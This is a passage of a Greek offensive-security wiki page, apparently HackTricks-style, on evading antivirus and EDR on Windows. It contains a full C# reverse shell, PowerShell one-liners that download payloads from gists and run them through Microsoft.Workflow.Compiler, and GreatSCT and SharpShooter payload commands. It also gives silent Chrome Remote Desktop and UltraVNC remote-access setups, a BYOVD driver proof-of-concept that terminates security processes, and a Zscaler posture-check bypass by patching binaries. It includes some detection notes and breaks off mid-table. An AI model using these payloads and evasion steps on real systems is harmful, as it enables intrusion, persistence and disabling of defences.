Ακολουθεί ένα demo για το bypass του SmartScreen συσκευάζοντας payloads μέσα σε αρχεία ISO με το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει σε εφαρμογές και στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως και το AMSI μπορεί να απενεργοποιηθεί (bypass), είναι επίσης δυνατό η συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει συμβάντα. Αυτό επιτυγχάνεται με την τροποποίηση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο εκτέλεσης των post-exploitation εργαλείων σας χωρίς να εντοπιστείτε από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να μεριμνήσουμε μόνο για το patching του AMSI σε ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το πετύχετε:

- **Fork\&Run**

Περιλαμβάνει την **εκκίνηση μιας νέας sacrificial διεργασίας**, την έγχυση του κακόβουλου post-exploitation κώδικά σας σε αυτήν, την εκτέλεση του κακόβουλου κώδικα και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση πραγματοποιείται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά κατά τη post-exploitation ενέργειά μας ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την έγχυση του κακόβουλου post-exploitation κώδικα **στη δική του διεργασία**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Ανασυσκευασία εργαλείων .NET σε WebAssembly με NativeAOT (WasmForge)

Οι συνηθισμένες τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει αντί γι' αυτό το υπόβαθρο εκτέλεσης: μεταφέρει ένα C# project στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει το module σε έναν Windows PE host που βασίζεται στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, τον JIT ή το `dotnet` host του στόχου, επομένως οι κανόνες που βασίζονται αποκλειστικά σε ονόματα managed assemblies, στη φόρτωση CLR, στο AMSI ή στο .NET ETW δεν έχουν άμεση ορατότητα. Πρόκειται για τεχνική evasion/συσκευασίας, όχι για bypass ορίου προνομίων — ο guest διατηρεί τα αρχικά δικαιώματα του εργαλείου και την παρατηρήσιμη συμπεριφορά του στο λειτουργικό σύστημα.<sup>[[44]](#references)[[45]](#references)</sup>

### Δημιουργία C# project

Η προτεινόμενη διαδρομή build είναι το Docker environment του project, καθώς περιλαμβάνει το .NET 10 SDK, το NativeAOT-LLVM workload, το WASI SDK 24.0, τον linker και τις εξαρτήσεις υπογραφής. Ένα `.csproj` εντοπίζεται αυτόματα· το build μίας εντολής εκτελεί τη migration, το patching συμβατότητας, τη μεταγλώττιση WASM, τη δημιουργία του PE και την υπογραφή.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για troubleshooting ή έλεγχο του παραγόμενου κώδικα, χωρίστε τη διαδικασία σε `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Το build image χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld` για να αποφύγει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το ενσωματωμένο runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γέφυρα από wasm32 C# σε x64 Win32

Αυτό δεν είναι διαφανής επαναμεταγλώττιση. Το NativeAOT-WASI δεν διαθέτει ορισμένες δυνατότητες του Windows-oriented BCL ή τις αλλάζει, ενώ ένας wasm32 guest συνήθως δεσμεύει θέσεις δεικτών τεσσάρων byte, την ώρα που τα x64 API μπορούν να επιστρέψουν δείκτες οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα ακόλουθα παραγόμενα επίπεδα:<sup>[[44]](#references)</sup>

1. Ένα source patcher διορθώνει σημασιολογικές διαφορές ειδικές για AOT και ανακατευθύνει μη υποστηριζόμενες κλήσεις μητρώου, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες κλήσεις σε βοηθητικές συναρτήσεις `Wf*`.
2. Ένας P/Invoke scanner παράγει αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με συνδεδεμένα σύμβολα C bridge αντί να φορτώνουν δυναμικά τη δηλωμένη DLL μέσα στον guest.
3. Οι δείκτες που περνούν στο host χρησιμοποιούν `ulong` στη C# και `uint64_t` στη C. Ένας generic dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις πραγματικές θέσεις εξόδου οκτώ byte, των οποίων τα ανώτερα μισά πρέπει να διατηρηθούν. Για τις μη επισημασμένες εξόδους σε μορφή wasm32 χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην αλλοιώσει τα γειτονικά τέσσερα byte.
4. Εξειδικευμένα host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη γενική αποστολή syscall, όπως πρόσβαση στην cache ticket του LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, TCP KDC traffic και LDAP queries.

Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις host και θέτει τα bit 2 και 3 (`0xC`), επειδή ο δείκτης value και το length είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει generic και αναθέτει το όνομα DLL, το όνομα export, τα arguments και το mask στο `wf_call_v2`· το host πραγματοποιεί τη μετάφραση δεικτών και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία αλλαγής κατεύθυνσης για τον εντοπισμό

Κώδικας με εκτεταμένη χρήση reflection, δυναμική φόρτωση assembly, αυθαίρετα native callbacks και σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM μπορεί να εξακολουθούν να απαιτούν patches ανά εργαλείο ή να αποτυγχάνουν εντελώς. Τα γενικά sockets του WASI Preview 2 μπορεί επίσης να καταλήγουν σε no-op stubs, γι’ αυτό τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επαληθεύστε κάθε εντολή σε σχέση με ένα native build αντί να θεωρείτε δεδομένη την ισοδυναμία των λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει τα telemetry αντί να καθιστά το payload αόρατο. Ο εντοπισμός μπορεί να στραφεί σε ένα PE που περιέχει ή δημιουργεί ένα WASM module, στη συμπεριφορά ενός runtime τύπου Wazero, σε ασυνήθιστη κατανομή και αντιγραφή μνήμης host/guest, σε γενική απευθείας αποστολή εντολών Win32, σε ανωμαλίες υπογραφής και πόρων PE, καθώς και στις κλήσεις API και την κίνηση δικτύου που προκύπτουν. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να εκλαμβάνεται ως ένδειξη ότι μια διεργασία είναι ακίνδυνη.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα με άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει: το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated scripts reverse shell σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## Re-hosting WebAssembly για αποφυγή static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το token stomping χειραγωγεί το access token ενός προϊόντος ασφάλειας, όπως ένα EDR ή AV. Η μείωση των δικαιωμάτων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, ενώ την εμποδίζει να εκτελεί προνομιακές ενέργειες επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** να αποκτούν handles στα tokens διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και έπειτα να το χρησιμοποιήσετε για να αποκτήσετε τον έλεγχό του και να διατηρήσετε την persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από τη διεύθυνση https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH" και έπειτα στο MSI αρχείο για Windows, ώστε να κατεβάσετε το MSI αρχείο.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο θύμα (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).
 

## Προηγμένη αποφυγή εντοπισμού

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή εντοπισμού είναι ένα πολύ περίπλοκο θέμα· μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, επομένως είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα βρεθείτε αντιμέτωποι θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο Προηγμένων τεχνικών αποφυγής εντοπισμού.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την αποφυγή εντοπισμού σε βάθος.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που το Defender εντοπίζει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και να το απομονώσει για εσάς.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι το** [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία μέσω ενός ανοιχτού web interface στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν ξεκινά το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεστε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το binary _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε μέσα στο **θύμα**

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια αντίστροφη **VNC σύνδεση**. Έπειτα, μέσα στο **θύμα**: Ξεκινήστε τον winvnc daemon με `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη μυστικότητα, μην κάνετε τα εξής:

- Μην ξεκινήσετε το `winvnc` αν εκτελείται ήδη, αλλιώς θα εμφανιστεί ένα [αναδυόμενο παράθυρο](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα ανοίξει [το παράθυρο διαμόρφωσης](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, αλλιώς θα εμφανιστεί ένα [αναδυόμενο παράθυρο](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον listener** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Το τρέχον Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλωττίζοντας το δικό μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση Python για παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Φέρε τον δικό σου ευάλωτο driver (BYOVD) – Εξουδετέρωση AV/EDR από τον χώρο του kernel

Το Storm-2603 χρησιμοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoints πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελεί προνομιούχες λειτουργίες στον kernel, τις οποίες δεν μπορούν να εμποδίσουν ούτε οι υπηρεσίες AV με Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά σημεία
1. **Υπογεγραμμένος driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το «System In-Depth Analysis Toolkit» της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το userland.
3. **IOCTLs που εκθέτει ο driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Εκφόρτωση του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να αλλοιώσει αντικείμενα του kernel, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες δυνατότητες hardening.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθήστε τη δημιουργία νέων υπηρεσιών *kernel* και ειδοποιηθείτε όταν φορτώνεται ένα πρόγραμμα οδήγησης από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθήστε handles από user-mode προς προσαρμοσμένα αντικείμενα συσκευών, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector μέσω τροποποίησης binary στον δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να κοινοποιεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (αποστέλλεται ένας boolean στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω του `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με **τροποποίηση τεσσάρων υπογεγραμμένων binaries στον δίσκο**, και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Αρχική λογική που τροποποιήθηκε | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται συμμορφούμενος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Γίνεται NOP ⇒ οποιαδήποτε διεργασία (ακόμη και χωρίς υπογραφή) μπορεί να συνδεθεί στα RPC pipes |
